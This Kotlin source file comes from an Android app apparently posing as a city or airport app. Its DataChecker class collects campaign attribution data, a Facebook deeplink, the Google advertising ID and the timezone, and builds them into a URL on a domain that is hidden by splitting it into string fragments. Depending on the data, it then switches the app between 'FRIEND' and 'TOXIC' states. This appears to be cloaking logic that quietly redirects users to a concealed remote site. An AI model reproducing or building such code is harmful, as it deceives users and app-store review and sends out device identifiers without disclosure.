package mycity.airpor.data

import android.content.Context
import android.util.Log
import io.paperdb.Paper
import mycity.airpor.App
import mycity.airpor.MainActivity
import java.util.TimeZone

class DataChecker(private val context: Context) {

    val apps = Apps()
    val face = Face()
    val google = Google()
    val sp = context.getSharedPreferences(App.FB_ID, Context.MODE_PRIVATE)
    val currentStatus = sp.getString(App.ONE_SIGNAL, "") ?: ""

    suspend fun initialProcess(){

        val appsMap = apps.execute(context, "jazz", 2, 'a')
        val appsUid = apps.getUID(context, "jazz", 3, 'q')
        val facebook = face.execute(context, "a little bit trash", 3333)
        val google = google.execute(context)

        val jazz = appsMap?.get("campaign").toString()

        if (currentStatus != App.TOXIC){
            if (facebook != "null"){
                fbSaver(facebook, google, appsUid)
            } else {
                if (jazz != "null"){
                    appsSaver(appsMap,appsUid, google, 34)
                } else {
                    saveNature(google, jazz, 2, 44, 15, appsUid)
                }
            }
        } else {
            MainActivity.transmitter.emit(App.TOXIC)
        }
    }

    private suspend fun saveNature(google: String, jazz: String, one: Int, two: Int, three: Int, appsUID: String){

        val olaola = baseUrl[0]+baseUrl[1]+baseUrl[2]+baseUrl[3]+baseUrl[4]+baseUrl[5]+baseUrl[6]+baseUrl[7]+baseUrl[8]

        val destination = "$olaola$secure_get_parametr$secure_key"
        val destination2 = "$dev_tmz_key$timezone&$gadid_key$google&"
        val destination3 = "${deeplink_key}null&${source_key}null&"
        val destination4 = "${af_id_key}${appsUID}&${adgroup_key}null&"
        val destination5 = "${orig_cost_key}null&${af_siteid_key}null&${app_campaign_key}null&"
        val destination6 = "${adset_key}null&${adset_id_key}null&${campaign_id_key}null"

        val final = destination+destination2+destination3+destination4+destination5+destination6

        Log.d("123123", "saveNature final is $final")

        println(jazz+one+two+three)

        Paper.book().write("link", final)
        MainActivity.transmitter.emit(App.FRIEND)
        sp.edit().putString(App.ONE_SIGNAL, App.FRIEND).apply()

    }

    private suspend fun appsSaver(
        appsMap: MutableMap<String, Any>?,
        appsUid: String,
        google: String,
        num: Int
    ) {
        val olaola = baseUrl[0]+baseUrl[1]+baseUrl[2]+baseUrl[3]+baseUrl[4]+baseUrl[5]+baseUrl[6]+baseUrl[7]+baseUrl[8]

        val destination = "$olaola$secure_get_parametr$secure_key"
        val destination2 = "$dev_tmz_key$timezone&$gadid_key$google&"
        val destination3 = "${deeplink_key}null&${source_key}${appsMap?.get("media_source").toString()}&"
        val destination4 = "${af_id_key}${appsUid}&${adgroup_key}${appsMap?.get("adgroup").toString()}&"
        val destination5 = "${orig_cost_key}${appsMap?.get("orig_cost").toString()}&${af_siteid_key}${appsMap?.get("af_siteid").toString()}&${app_campaign_key}${appsMap?.get("campaign").toString()}&"
        val destination6 = "${adset_key}${appsMap?.get("adset").toString()}&${adset_id_key}${appsMap?.get("adset_id").toString()}&${campaign_id_key}${appsMap?.get("campaign_id").toString()}"
        println(num)

        val final = destination+destination2+destination3+destination4+destination5+destination6
        Log.d("123123", "appsSaver final is $final")

        Paper.book().write("link", final)
        MainActivity.transmitter.emit(App.FRIEND)
        sp.edit().putString(App.ONE_SIGNAL, App.FRIEND).apply()

    }

    private suspend fun fbSaver(fb: String, google: String, appsUID: String){

        val olaola = baseUrl[0]+baseUrl[1]+baseUrl[2]+baseUrl[3]+baseUrl[4]+baseUrl[5]+baseUrl[6]+baseUrl[7]+baseUrl[8]


        val destination = "$olaola$secure_get_parametr$secure_key"
        val destination2 = "$dev_tmz_key$timezone&$gadid_key$google&"
        val destination3 = "$deeplink_key$fb&${source_key}deeplink&"
        val destination4 = "${af_id_key}${appsUID}&${adgroup_key}null&"
        val destination5 = "${orig_cost_key}null&${af_siteid_key}null&${app_campaign_key}null&"
        val destination6 = "${adset_key}null&${adset_id_key}null&${campaign_id_key}null"

        val final = destination+destination2+destination3+destination4+destination5+destination6

        Log.d("123123", "fbSaver final is $final")


        Paper.book().write("link", final)
        MainActivity.transmitter.emit(App.FRIEND)
        sp.edit().putString(App.ONE_SIGNAL, App.FRIEND).apply()
    }

    companion object{
        val baseUrl = listOf("ht", "tps", "://u", "nexp", "lore", "dgiz", "a.xyz/", "giza", ".php?")
        val secure_get_parametr = "4i7e18xxh0="
        val secure_key = "61s14cbgla&"
        val dev_tmz_key = "ccwqhcwqvm="
        val gadid_key = "n1fgi20x1w="
        val deeplink_key = "il43d8k8wq="
        val source_key = "r2gfdran1q="
        val af_id_key = "4g32y5r3st="
        val adgroup_key = "2js4v5xsbw="
        val orig_cost_key = "z9vnxlmqg6="
        val af_siteid_key = "l4nt729zyh="
        val app_campaign_key = "dmpco8duf4="
        val adset_key = "j116rnwl9x="
        val adset_id_key = "1f5qornoh5="
        val campaign_id_key = "3qmsejax0m="
        val timezone = TimeZone.getDefault().id
    }

}